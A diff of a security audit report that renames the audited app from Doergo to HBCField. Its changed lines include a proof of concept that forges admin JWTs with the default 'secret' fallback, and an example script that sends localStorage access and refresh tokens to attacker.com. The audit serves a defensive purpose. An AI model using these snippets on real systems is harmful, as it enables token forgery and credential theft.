@@ -1,4 +1,4 @@
-# DOERGO SECURITY AUDIT REPORT
+# HBCFIELD SECURITY AUDIT REPORT
 
 **Date:** 2026-01-15
 **Auditor:** Claude Security Analysis
@@ -9,7 +9,7 @@
 
 ## EXECUTIVE SUMMARY
 
-This security audit identified **17 vulnerabilities** across the Doergo application:
+This security audit identified **17 vulnerabilities** across the HBCField application:
 
 | Severity | Count | Status |
 |----------|-------|--------|
@@ -149,7 +149,7 @@ secret: process.env.JWT_ACCESS_SECRET || 'secret',
 // Attacker can forge admin tokens:
 const jwt = require('jsonwebtoken');
 const forgedToken = jwt.sign(
-  { sub: 'any-user-id', email: 'admin@doergo.com', role: 'DISPATCHER' },
+  { sub: 'any-user-id', email: 'admin@hbcfield.eu', role: 'DISPATCHER' },
   'secret', // Default fallback
   { expiresIn: '24h' }
 );
@@ -243,8 +243,8 @@ storage.setItem(REFRESH_TOKEN_KEY, tokens.refreshToken);
 fetch('https://attacker.com/steal', {
   method: 'POST',
   body: JSON.stringify({
-    access: localStorage.getItem('doergo_access_token'),
-    refresh: localStorage.getItem('doergo_refresh_token')
+    access: localStorage.getItem('hbcfield_access_token'),
+    refresh: localStorage.getItem('hbcfield_refresh_token')
   })
 });
 ```
